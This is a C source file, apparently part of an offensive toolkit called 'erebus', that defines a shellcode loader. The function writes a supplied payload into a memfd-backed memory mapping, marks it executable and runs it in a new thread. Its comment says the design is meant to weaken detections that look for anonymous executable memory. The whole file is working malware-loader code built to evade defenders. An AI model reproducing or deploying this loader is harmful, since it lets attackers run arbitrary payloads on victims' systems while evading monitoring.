#define _GNU_SOURCE
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "../../include/injection.h"

/* Inline syscall wrapper - avoids glibc memfd_create symbol (glibc >= 2.27). */
static inline int _memfd_create(const char *name, unsigned int flags)
{
    return (int)syscall(SYS_memfd_create, name, flags);
}

static void *_run(void *arg)
{
    void (*fn)(void) = (void (*)(void))arg;
    fn();
    return NULL;
}

/*
 * Creates a file-backed mapping via memfd_create.
 * In /proc/<pid>/maps the region appears as "/memfd:<name>" rather than
 * the anonymous "[anon]" label, reducing the signature strength of
 * trivial "find RWX anonymous mappings" detections.
 * Requires Linux kernel >= 3.17.
 */
void erebus_memfd_exec(const unsigned char *sc, size_t sc_len)
{
    int fd = _memfd_create("", 0);
    if (fd < 0) return;

    if (ftruncate(fd, (off_t)sc_len) != 0) { close(fd); return; }

    void *mem = mmap(NULL, sc_len,
                     PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, 0);
    if (mem == MAP_FAILED) { close(fd); return; }

    memcpy(mem, sc, sc_len);

    if (mprotect(mem, sc_len, PROT_READ | PROT_EXEC) != 0) {
        munmap(mem, sc_len);
        close(fd);
        return;
    }

    __builtin___clear_cache((char *)mem, (char *)mem + sc_len);

    pthread_t tid;
    if (pthread_create(&tid, NULL, _run, mem) != 0) {
        munmap(mem, sc_len);
        close(fd);
        return;
    }
    pthread_join(tid, NULL);
    munmap(mem, sc_len);
    close(fd);
}
